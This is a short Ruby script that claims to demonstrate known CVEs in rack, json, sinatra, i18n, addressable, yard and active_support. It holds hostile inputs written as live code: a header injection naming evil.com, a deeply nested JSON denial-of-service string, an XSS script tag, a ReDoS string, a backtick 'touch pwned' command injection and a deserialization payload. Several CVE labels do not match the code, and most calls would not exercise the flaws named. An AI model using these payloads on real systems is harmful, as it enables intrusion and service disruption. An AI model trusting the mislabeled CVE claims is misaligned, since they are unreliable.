require 'rack'
require 'json'
require 'sinatra'
require 'i18n'
require 'addressable'
require 'yard'
require 'active_support'

class VulnerableDemo
  def demonstrate_vulnerabilities
    # Rack Header Injection (CVE-2018-16471)
    malicious_header = "X-Forwarded-Host: example.com\r\nX-Forwarded-Host: evil.com"
    env = { 'HTTP_X_FORWARDED_HOST' => malicious_header }
    request = Rack::Request.new(env)

    # JSON DoS (CVE-2018-8945)
    malicious_json = '{"a":' * 100000 + '1' + '}' * 100000
    JSON.parse(malicious_json)

    # Sinatra RCE (CVE-2018-7212)
    eval("puts 'Hello from eval'")  # Sinatra unsafe eval demonstration

    # i18n XSS (CVE-2014-10077)
    I18n.locale = :en
    I18n.backend.store_translations(:en, :vulnerable => '<script>alert(1)</script>')
    I18n.t(:vulnerable, :sanitize => false)

    # Addressable ReDoS (CVE-2021-32740)
    uri = Addressable::URI.parse("http://example.com/?foo=#{('a' * 100000)}...")

    # YARD Command Injection (CVE-2017-17042)
    YARD::CLI::Command.run("markup --type rdoc --file '`touch pwned`'")

    # ActiveSupport Deserialization (CVE-2020-8165)
    payload = '{"json_class":"ActiveSupport::TimeWithZone","attributes":["---\nfoo: bar\n"]}'
    ActiveSupport::JSON.decode(payload)
  end
end

# Initialize the demo
demo = VulnerableDemo.new
demo.demonstrate_vulnerabilities 